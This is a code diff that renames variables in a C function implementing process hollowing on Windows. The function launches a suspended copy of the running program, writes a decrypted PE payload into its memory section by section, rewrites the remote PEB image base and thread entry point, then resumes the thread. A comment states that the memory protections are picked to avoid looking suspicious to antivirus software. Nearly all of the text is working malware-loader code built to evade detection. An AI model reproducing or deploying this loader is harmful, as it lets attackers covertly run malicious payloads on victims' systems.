@@ -17,64 +17,64 @@ void custom_GetModuleFileNameA(char* out, DWORD size)
 
 int ProcessHollowing(uint8_t* decrypted, unsigned long payloadSize)
 {
-    ProcessContext ctx = {0};
-    ctx.pe = decrypted;
-    ctx.DOSHeader = (PIMAGE_DOS_HEADER)ctx.pe;
-    ctx.NtHeader = (IMAGE_NT_HEADERS64*)((uint8_t*)ctx.pe + ctx.DOSHeader->e_lfanew);
+    ProcessContext processCtx = {0};
+    processCtx.pe = decrypted;
+    processCtx.DOSHeader = (PIMAGE_DOS_HEADER)processCtx.pe;
+    processCtx.NtHeader = (IMAGE_NT_HEADERS64*)((uint8_t*)processCtx.pe + processCtx.DOSHeader->e_lfanew);
 
-    if (ctx.NtHeader->Signature != IMAGE_NT_SIGNATURE)
+    if (processCtx.NtHeader->Signature != IMAGE_NT_SIGNATURE)
     {
         return 1;
     }
 
-    custom_GetModuleFileNameA(ctx.currentFilePath, MAX_PATH);
+    custom_GetModuleFileNameA(processCtx.currentFilePath, MAX_PATH);
     
-    if (!CreateProcessA(ctx.currentFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &ctx.SI, &ctx.PI))
+    if (!CreateProcessA(processCtx.currentFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &processCtx.SI, &processCtx.PI))
     {
         return 1;
     }
 
-    ctx.CTX = (CONTEXT*)VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT, PAGE_READWRITE);
-    if (!ctx.CTX)
+    processCtx.CTX = (CONTEXT*)VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT, PAGE_READWRITE);
+    if (!processCtx.CTX)
     {
-        TerminateProcess(ctx.PI.hProcess, 1);
+        TerminateProcess(processCtx.PI.hProcess, 1);
         return 1;
     }
 
-    ctx.CTX->ContextFlags = CONTEXT_FULL;
-    if (!GetThreadContext(ctx.PI.hThread, ctx.CTX))
+    processCtx.CTX->ContextFlags = CONTEXT_FULL;
+    if (!GetThreadContext(processCtx.PI.hThread, processCtx.CTX))
     {
         goto cleanup;
     }
 
-    ctx.pImageBase = VirtualAllocEx(
-        ctx.PI.hProcess,
-        (LPVOID)(ctx.NtHeader->OptionalHeader.ImageBase),
-        ctx.NtHeader->OptionalHeader.SizeOfImage,
+    processCtx.pImageBase = VirtualAllocEx(
+        processCtx.PI.hProcess,
+        (LPVOID)(processCtx.NtHeader->OptionalHeader.ImageBase),
+        processCtx.NtHeader->OptionalHeader.SizeOfImage,
         MEM_COMMIT | MEM_RESERVE,
         PAGE_READWRITE
     );
 
-    if (!ctx.pImageBase)
+    if (!processCtx.pImageBase)
     {
         goto cleanup;
     }
 
-    WriteProcessMemory(ctx.PI.hProcess, ctx.pImageBase, ctx.pe, 
-        ctx.NtHeader->OptionalHeader.SizeOfHeaders, NULL);
+    WriteProcessMemory(processCtx.PI.hProcess, processCtx.pImageBase, processCtx.pe, 
+        processCtx.NtHeader->OptionalHeader.SizeOfHeaders, NULL);
 
-    for (size_t i = 0; i < ctx.NtHeader->FileHeader.NumberOfSections; i++)
+    for (size_t i = 0; i < processCtx.NtHeader->FileHeader.NumberOfSections; i++)
     {
-        ctx.SectionHeader = (PIMAGE_SECTION_HEADER)(
-            (uint8_t*)ctx.pe + ctx.DOSHeader->e_lfanew + 
+        processCtx.SectionHeader = (PIMAGE_SECTION_HEADER)(
+            (uint8_t*)processCtx.pe + processCtx.DOSHeader->e_lfanew + 
             sizeof(IMAGE_NT_HEADERS64) + (i * sizeof(IMAGE_SECTION_HEADER))
         );
 
         WriteProcessMemory(
-            ctx.PI.hProcess,
-            (LPVOID)((uintptr_t)ctx.pImageBase + ctx.SectionHeader->VirtualAddress),
-            (LPVOID)((uintptr_t)ctx.pe + ctx.SectionHeader->PointerToRawData),
-            ctx.SectionHeader->SizeOfRawData,
+            processCtx.PI.hProcess,
+            (LPVOID)((uintptr_t)processCtx.pImageBase + processCtx.SectionHeader->VirtualAddress),
+            (LPVOID)((uintptr_t)processCtx.pe + processCtx.SectionHeader->PointerToRawData),
+            processCtx.SectionHeader->SizeOfRawData,
             NULL
         );
 
@@ -82,7 +82,7 @@ int ProcessHollowing(uint8_t* decrypted, unsigned long payloadSize)
         Because PAGE_EXECUTE_READWRITE is too suspicious for antiviruses */
         
         DWORD protect = PAGE_NOACCESS;
-        DWORD chars = ctx.SectionHeader->Characteristics;
+        DWORD chars = processCtx.SectionHeader->Characteristics;
         if (chars & IMAGE_SCN_MEM_EXECUTE)
         {
             if (chars & IMAGE_SCN_MEM_WRITE)
@@ -101,35 +101,36 @@ int ProcessHollowing(uint8_t* decrypted, unsigned long payloadSize)
         }
         DWORD oldProtect;
         VirtualProtectEx(
-            ctx.PI.hProcess,
-            (LPVOID)((uintptr_t)ctx.pImageBase + ctx.SectionHeader->VirtualAddress),
-            ctx.SectionHeader->Misc.VirtualSize,
+            processCtx.PI.hProcess,
+            (LPVOID)((uintptr_t)processCtx.pImageBase + processCtx.SectionHeader->VirtualAddress),
+            processCtx.SectionHeader->Misc.VirtualSize,
             protect,
             &oldProtect
         );
     }
 
+    // Updating ImageBaseAddress in remote PEB
     WriteProcessMemory(
-        ctx.PI.hProcess,
-        (LPVOID)(ctx.CTX->Rdx + 0x10),
-        &ctx.NtHeader->OptionalHeader.ImageBase,
+        processCtx.PI.hProcess,
+        (LPVOID)(processCtx.CTX->Rdx + 0x10),
+        &processCtx.NtHeader->OptionalHeader.ImageBase,
         sizeof(uint64_t),
         NULL
     );
 
-    ctx.CTX->Rip = (uintptr_t)ctx.pImageBase + ctx.NtHeader->OptionalHeader.AddressOfEntryPoint;
-    SetThreadContext(ctx.PI.hThread, ctx.CTX);
-    ResumeThread(ctx.PI.hThread);
-    WaitForSingleObject(ctx.PI.hProcess, INFINITE);
+    processCtx.CTX->Rip = (uintptr_t)processCtx.pImageBase + processCtx.NtHeader->OptionalHeader.AddressOfEntryPoint;
+    SetThreadContext(processCtx.PI.hThread, processCtx.CTX);
+    ResumeThread(processCtx.PI.hThread);
+    WaitForSingleObject(processCtx.PI.hProcess, INFINITE);
 
-    VirtualFree(ctx.CTX, 0, MEM_RELEASE);
+    VirtualFree(processCtx.CTX, 0, MEM_RELEASE);
     return 0;
 
 cleanup:
-    if (ctx.CTX)
+    if (processCtx.CTX)
     {
-        VirtualFree(ctx.CTX, 0, MEM_RELEASE);
+        VirtualFree(processCtx.CTX, 0, MEM_RELEASE);
     }
-    TerminateProcess(ctx.PI.hProcess, 1);
+    TerminateProcess(processCtx.PI.hProcess, 1);
     return 1;
 }
